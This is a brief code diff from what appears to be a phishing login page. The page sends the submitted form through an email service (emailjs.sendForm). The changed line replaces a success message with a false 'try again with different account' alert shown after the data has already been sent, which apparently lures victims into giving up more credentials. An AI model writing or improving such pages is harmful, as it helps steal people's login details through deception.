@@ -12,7 +12,7 @@ document.getElementById('form')
    emailjs.sendForm(serviceID, templateID, this)
     .then(() => {
       btn.value = 'Login';
-      alert('You are Login!');
+      alert('Please,try again with different account!');
     }, (err) => {
       btn.value = 'Login';
       alert(JSON.stringify(err));
